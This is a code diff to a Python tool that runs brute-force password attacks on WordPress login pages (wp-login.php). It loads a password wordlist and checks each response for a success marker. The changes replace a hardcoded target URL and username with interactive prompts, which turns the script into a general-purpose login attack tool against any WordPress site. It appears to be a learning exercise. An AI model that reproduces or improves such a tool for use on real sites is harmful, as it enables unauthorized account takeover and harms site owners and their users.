@@ -10,7 +10,7 @@ import time
 
 EXTENSIONS = ['.php', '.bak', '.orig', '.inc']
 SUCCESS = 'Welcome to WordPress!'
-WORDLIST = '/Users/jtimarnold/Downloads/cain.txt'
+WORDLIST = '/mydownloads/cain.txt'
 
 def get_params(content):
     params = dict()
@@ -29,7 +29,7 @@ class Bruter:
         self.url = url
         self.found = False
         print(f'\nBrute Force Attack beginning on {url}.\n')
-        print("Finished the setup where username = %s\n" % username)
+        print("Finished setup; username = %s\n" % username)
 
     def run_bruteforce(self, passwords):
         for _ in range(10):
@@ -63,9 +63,10 @@ class Bruter:
                 
 
 if __name__ == '__main__':
-    url = "http://boodelyboo.com/wordpress/wp-login.php"
+    username = input('Enter username: ')
+    url = input("input WP url: ")
     words = get_words(WORDLIST)
-    b = Bruter('tiarno', url)
+    b = Bruter(username, url)
     b.run_bruteforce(deque(words))
 
 
